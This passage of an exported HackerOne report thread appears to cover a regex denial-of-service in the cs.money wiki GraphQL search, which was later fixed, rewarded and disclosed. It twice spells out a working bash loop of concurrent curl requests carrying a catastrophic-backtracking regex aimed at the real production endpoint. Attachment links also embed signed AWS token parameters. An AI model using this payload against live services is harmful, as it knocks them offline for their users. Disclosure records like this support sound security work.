\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en }\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003en}\u0026quot;,\u0026quot;variables\u0026quot;:null}\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--compressed\u003c/span\u003e  \u0026amp; \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eYour service (graphql) was down after test.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSimple that.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2020-10-08T12:28:27.059Z","updated_at":"2020-10-08T12:29:24.392Z","actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1027347,"filename":"recording-1602160097972.webm","type":"video/webm","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xZiz9mUEujZMnRGtvsLWs2oh?response-content-disposition=attachment%3B%20filename%3D%22recording-1602160097972.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1602160097972.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041050Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=b044b0498a360bace5766479e9fb6102382a419e9191dfca8e5b9cd83ad961e7"}],"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9458731,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey!\nWe are going to see the logs, for the confirmation if it was in fact down.","markdown_message":"\u003cp\u003eHey!\u003cbr\u003e\nWe are going to see the logs, for the confirmation if it was in fact down.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-08T12:43:02.230Z","updated_at":"2020-10-08T12:43:02.230Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9465880,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey! \nAny news? That DoS attack was confirmed in your logs? ","markdown_message":"\u003cp\u003eHey! \u003cbr\u003e\nAny news? That DoS attack was confirmed in your logs? \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-09T03:26:21.584Z","updated_at":"2020-10-09T03:26:21.584Z","actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9504580,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey!\nDoes not look like this.","markdown_message":"\u003cp\u003eHey!\u003cbr\u003e\nDoes not look like this.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-13T11:29:11.184Z","updated_at":"2020-10-13T11:29:11.184Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1033815,"filename":"logs.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vgfC3YrsqhzCkQ2gDYHw7BA3?response-content-disposition=attachment%3B%20filename%3D%22logs.png%22%3B%20filename%2A%3DUTF-8%27%27logs.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041050Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=adab7365ac300c1a48aaf151c6ce99cf2a9ab6280cbbec89882b2fc6d73245e6"}],"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9504950,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey!\n\nYour log is clear to me, your server process was down (about zero network traffic + about 100% CPU + process memory was released).\n\nSee about 6h~9h , the thread/process freeze the network, without use memory, it's your CPU stressed with the ReGex bomb here. \nI sent the comment on report in October 8, 2020 09:29:24 GMT-03, about 15 minutes after attacking your service.\n\nIf you want to confere, execute this on bash (prefer to do it on your stating environment, because this will freeze your process):\n\n```\nfor i in {1..100}; do curl 'https://wiki.cs.money/graphql'  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*'      --data-binary $'{\"query\":\"query a { \\\\n  search(q: \\\\\"[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\'\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\", lang: \\\\\"en\\\\\") {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\",\"variables\":null}' --compressed  \u0026 done\n```\n","markdown_message":"\u003cp\u003eHey!\u003c/p\u003e\n\n\u003cp\u003eYour log is clear to me, your server process was down (about zero network traffic + about 100% CPU + process memory was released).\u003c/p\u003e\n\n\u003cp\u003eSee about 6h~9h , the thread/process freeze the network, without use memory, it\u0026#39;s your CPU stressed with the ReGex bomb here. \u003cbr\u003e\nI sent the comment on report in October 8, 2020 09:29:24 GMT-03, about 15 minutes after attacking your service.\u003c/p\u003e\n\n\u003cp\u003eIf you want to confere, execute this on bash (prefer to do it on your stating environment, because this will freeze your process):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efor i in {1..100}; do curl \u0026#39;https://wiki.cs.money/graphql\u0026#39;  -H \u0026#39;user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36\u0026#39; -H \u0026#39;content-type: application/json\u0026#39; -H \u0026#39;accept: */*\u0026#39;      --data-binary $\u0026#39;{\u0026quot;query\u0026quot;:\u0026quot;query a { \\\\n  search(q: \\\\\u0026quot;[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\\u0026#39;\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\u0026quot;, lang: \\\\\u0026quot;en\\\\\u0026quot;) {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\u0026quot;,\u0026quot;variables\u0026quot;:null}\u0026#39; --compressed  \u0026amp; done\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-10-13T12:07:33.115Z","updated_at":"2020-10-13T12:07:33.115Z","actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1033886,"filename":"logs.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Rfsm1BeseSJTZVY5uezBsaUH?response-content-disposition=attachment%3B%20filename%3D%22logs.png%22%3B%20filename%2A%3DUTF-8%27%27logs.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041050Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=bd441daee43372a1900eb74e91112621436affd86c6fd8c38407ced081b5de09"}],"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9506262,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay.\nGoing to see in that again.","markdown_message":"\u003cp\u003eOkay.\u003cbr\u003e\nGoing to see in that again.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-13T13:29:53.029Z","updated_at":"2020-10-13T13:29:53.029Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9528204,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-15T08:49:54.359Z","updated_at":"2020-10-15T08:49:54.359Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9529930,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mvm!\nFixed, please, validate.\nNo regular expression will be accepted by the server.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mvm\"\u003e@mvm\u003c/a\u003e!\u003cbr\u003e\nFixed, please, validate.\u003cbr\u003e\nNo regular expression will be accepted by the server.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T12:23:29.718Z","updated_at":"2020-10-15T12:23:29.718Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9530368,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yep, it's fixed now!","markdown_message":"\u003cp\u003eYep, it\u0026#39;s fixed now!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T13:10:52.845Z","updated_at":"2020-10-15T13:10:52.845Z","actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9543405,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-16T15:12:33.678Z","updated_at":"2020-10-16T15:12:33.678Z","actor":{"url":"/cs_money","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"CS Money"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"cs_money","collaborator":{"username":"mvm","url":"/mvm"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9543407,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-16T15:12:44.073Z","updated_at":"2020-10-16T15:12:44.073Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mvm","url":"/mvm"},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9544011,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Great! Thanks for the bounty!\nWill be nice to disclose it here on HackerOne's Hacktivity, can it be disclosed? ","markdown_message":"\u003cp\u003eGreat! Thanks for the bounty!\u003cbr\u003e\nWill be nice to disclose it here on HackerOne\u0026#39;s Hacktivity, can it be disclosed? \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-16T15:33:28.162Z","updated_at":"2020-10-16T15:33:28.162Z","first_to_agree":true,"actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9544022,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey!\nYou can request it, we will see about that.","markdown_message":"\u003cp\u003eHey!\u003cbr\u003e\nYou can request it, we will see about that.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-16T15:34:48.638Z","updated_at":"2020-10-16T15:34:48.638Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9544042,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, I'll be waiting (I made the request on latest post)","markdown_message":"\u003cp\u003eOk, I\u0026#39;ll be waiting (I made the request on latest post)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-16T15:37:12.529Z","updated_at":"2020-10-16T15:37:12.529Z","actor":{"username":"mvm","cleared":false,"url":"/mvm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9652440,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-27T19:30:34.739Z","updated_at":"2020-10-27T19:30:34.739Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9652441,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-27T19:30:34.838Z","updated_at":"2020-10-27T19:30:34.838Z","actor":{"username":"triage_team","cleared":false,"url":"/triage_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8YgxVBkgWzPrnmtFYUro9KKb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"cs_money","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}